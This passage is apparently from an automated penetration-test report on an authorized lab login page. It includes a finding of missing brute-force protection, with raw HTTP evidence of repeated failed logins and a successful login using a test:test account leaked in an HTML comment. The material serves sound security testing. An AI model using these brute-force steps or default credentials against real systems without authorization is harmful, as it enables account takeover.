    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

- Evidence `ev-mr30uoic-2` — `artifacts/s-0001/ev-mr30uoic-2/`

Request:

```http
POST /login HTTP/1.1
Host: target.local:32835
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded

username=nonexistentuser123&password=wrongpass123
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1900
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 04:46:03 GMT
expires: 0
keep-alive: timeout=5, max=99
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <!-- TODO: Delete the testing account (test:test). --> 
    <div class="container">
        <div class="row justify-content-center mt-5">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-body">
                        <h2 class="card-title text-center">Login</h2>
                        <form id="loginForm" action="/login" method="post">
                            <div class="mb-3">
                                <label for="username" class="form-label">Username:</label>
                                <input type="text" class="form-control" id="username" name="username" required>
                            </div>
                            <div class="mb-3">
                                <label for="password" class="form-label">Password:</label>
                                <input type="password" class="form-control" id="password" name="password" required>
                            </div>
                            <button type="submit" class="btn btn-primary">Login</button>
                        </form>
                        
                        <!-- Display error message if login fails -->
                        <div class="alert alert-danger mt-3" role="alert">
                            Invalid username or password
                        </div>
                        
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

<a id="finding-5"></a>

### 5. [LOW] [rate-limit] No rate-limiting / brute-force protection on POST /login

- Screen: `s-0001`
- Source: validator `claude-pilot`
- Scope basis: authorized target http://target.local:32835/login

The login endpoint applies no throttling, lockout, CAPTCHA, or backoff to repeated failed authentication attempts. ~20 consecutive failed logins for the same username (test) were all processed and returned the normal HTTP 200 "Invalid username or password" page — no 429, no Retry-After header, no account lockout, and no increasing delay. This permits unlimited online password brute-forcing / credential stuffing against any account.

**Reproduction**

```
1. POST /login with body username=test&password=brute&lt;N&gt; repeatedly (20+ times) in rapid succession. 2. Observe every response is HTTP 200 with the same "Invalid username or password" body — no 429, no Retry-After, no lockout message, no CAPTCHA challenge appears at any point. Negative control: a valid credential attempt still returns 302 to /home (auth logic works and is distinguishable); the failed attempts continue to be accepted and processed at attempt 20 exactly as at attempt 1.
```

**Evidence**

- Evidence `ev-mr30vlub-r` — `artifacts/s-0001/ev-mr30vlub-r/`

Request:

```http
POST /login HTTP/1.1
Host: target.local:32835
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded
authorization: <redacted>

username=test&password=test
```

Response:

```http
HTTP/1.1 302
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 197
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 04:46:46 GMT
expires: 0
keep-alive: timeout=5, max=100
location: /home
pragma: no-cache
server: Apache/2.4.67 (Debian)
set-cookie: <redacted>
vary: Cookie

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/home">/home</a>. If not, click the link.
```

- Evidence `ev-mr30wu8m-19` — `artifacts/s-0001/ev-mr30wu8m-19/`

Request:

```http
POST /login HTTP/1.1
Host: target.local:32835
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded
authorization: <redacted>

username=test&password=brute13
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1900
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 04:47:43 GMT
expires: 0
keep-alive: timeout=5, max=88
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <!-- TODO: Delete the testing account (test:test). --> 
    <div class="container">
        <div class="row justify-content-center mt-5">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-body">
                        <h2 class="card-title text-center">Login</h2>
                        <form id="loginForm" action="/login" method="post">
                            <div class="mb-3">
                                <label for="username" class="form-label">Username:</label>
                                <input type="text" class="form-control" id="username" name="username" required>
                            </div>
                            <div class="mb-3">
                                <label for="password" class="form-label">Password:</label>
                                <input type="password" class="form-control" id="password" name="password" required>
                            </div>
                            <button type="submit" class="btn btn-primary">Login</button>
                        </form>
                        
                        <!-- Display error message if login fails -->
                        <div class="alert alert-danger mt-3" role="alert">
                            Invalid username or password
                        </div>
                        
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```

- Evidence `ev-mr30wv04-1a` — `artifacts/s-0001/ev-mr30wv04-1a/`

Request:

```http
POST /login HTTP/1.1
Host: target.local:32835
user-agent: verdict-scanner/0.1
x-verdict: assessment
cookie: <redacted>
content-type: application/x-www-form-urlencoded
authorization: <redacted>

username=test&password=brute14
```

Response:

```http
HTTP/1.1 200
cache-control: public, max-age=0
connection: Keep-Alive
content-length: 1900
content-type: text/html; charset=utf-8
date: Thu, 02 Jul 2026 04:47:44 GMT
expires: 0
keep-alive: timeout=5, max=87
pragma: no-cache
server: Apache/2.4.67 (Debian)
vary: Accept-Encoding

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <link href="/static/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="/static/css/style.css">
</head>
<body>
    <!-- TODO: Delete the testing account (test:test). --> 
    <div class="container">
        <div class="row justify-content-center mt-5">
            <div class="col-md-6">
                <div class="card">
                    <div class="card-body">
                        <h2 class="card-title text-center">Login</h2>
                        <form id="loginForm" action="/login" method="post">
                            <div class="mb-3">
                                <label for="username" class="form-label">Username:</label>
                                <input type="text" class="form-control" id="username" name="username" required>
                            </div>
                            <div class="mb-3">
                                <label for="password" class="form-label">Password:</label>
                                <input type="password" class="form-control" id="password" name="password" required>
                            </div>
                            <button type="submit" class="btn btn-primary">Login</button>
                        </form>
                        
                        <!-- Display error message if login fails -->
                        <div class="alert alert-danger mt-3" role="alert">
                            Invalid username or password
                        </div>
                        
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Bootstrap Bundle with Popper -->
    <script src="/static/js/bootstrap.bundle.min.js"></script>
</body>
</html>
```
